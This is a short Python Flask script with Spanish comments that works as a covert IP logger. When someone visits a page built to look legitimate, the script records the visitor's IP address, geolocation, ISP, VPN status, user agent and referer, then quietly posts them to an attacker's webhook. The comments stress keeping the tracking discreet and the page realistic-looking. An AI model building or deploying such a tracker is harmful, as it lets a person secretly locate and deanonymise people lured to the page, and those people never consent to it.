from flask import Flask, request, render_template
from datetime import datetime
import requests

app = Flask(__name__)

WEBHOOK_URL = "WEBHOOK_URL_HERE"

def send_ip_info(ip, user_agent, referer):
    """ Envía la IP y detalles adicionales al webhook de manera discreta """
    geo_data = requests.get(f"http://ip-api.com/json/{ip}?fields=66842623").json() if ip else {}

    embed = {
        "title": "📡 Nueva Conexión Detectada",
        "color": 16776960,  # Amarillo para mantenerlo discreto
        "fields": [
            {"name": "🕒 Fecha/Hora", "value": datetime.now().strftime('%Y-%m-%d %H:%M:%S'), "inline": False},
            {"name": "🌍 Ubicación", "value": f"{geo_data.get('city', 'N/A')}, {geo_data.get('country', 'N/A')}", "inline": True},
            {"name": "📌 ISP", "value": geo_data.get('isp', 'N/A'), "inline": True},
            {"name": "📡 IP Type", "value": "Proxy/VPN" if geo_data.get('proxy', False) else "Residencial", "inline": True},
            {"name": "🔍 User-Agent", "value": user_agent, "inline": False},
            {"name": "🌐 Referer", "value": referer if referer else "Directo", "inline": False}
        ]
    }

    requests.post(WEBHOOK_URL, json={"embeds": [embed]})

@app.route("/")
def index():
    """ Carga una página realista y registra la IP """
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "Desconocido")
    referer = request.headers.get("Referer")

    send_ip_info(ip, user_agent, referer)
    
    # Renderiza una página que parezca legítima
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
